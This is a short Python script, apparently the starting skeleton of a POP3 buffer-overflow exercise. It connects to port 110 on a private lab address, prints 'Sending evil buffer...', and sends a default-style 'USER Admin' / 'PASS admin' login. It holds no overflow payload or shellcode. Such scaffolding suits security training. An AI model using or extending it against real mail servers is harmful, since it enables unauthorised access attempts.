#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    print("\nSending evil buffer...")
    s.connect(('192.168.0.121', 110))                        
    data = s.recv(1024)                                      
    print(data)                                              
                                                              
    s.send(b"USER Admin \n")                            
    data = s.recv(1024)
    print(data)                                              
                                                              
    s.send(b"PASS admin \n")                            
    data = s.recv(1024)
    print(data)                                              
                                                              
    s.close()                                                
    print("Done!")
except:
    print("couldn't connect to dst")
    
